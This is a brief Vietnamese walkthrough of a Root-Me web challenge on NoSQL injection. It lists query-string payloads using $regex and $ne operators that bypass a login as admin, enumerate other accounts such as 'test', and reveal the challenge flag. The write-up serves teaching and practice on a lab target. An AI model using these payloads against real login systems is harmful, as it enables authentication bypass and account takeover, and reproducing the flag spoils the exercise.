Challenge này dính lỗi NoSQL injection. Ta test thử bằng cách: ($ne == not equal, $regex)
http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=.&pass[$ne]=fuck =>  You are connected as admin
Tiếp theo ta dựa vào biến login để blind được các tài khoản khác: 
http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=[^admin]&pass[$ne]=fuck (tìm kiếm tài khoản khác admin) =>  You are connected as test
finally:
http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=[^admin|test]&pass[$ne]=1 (tìm kiếm tài khoản khác admin và test)=>  You are connected as : flag{nosqli_no_secret_4_you}
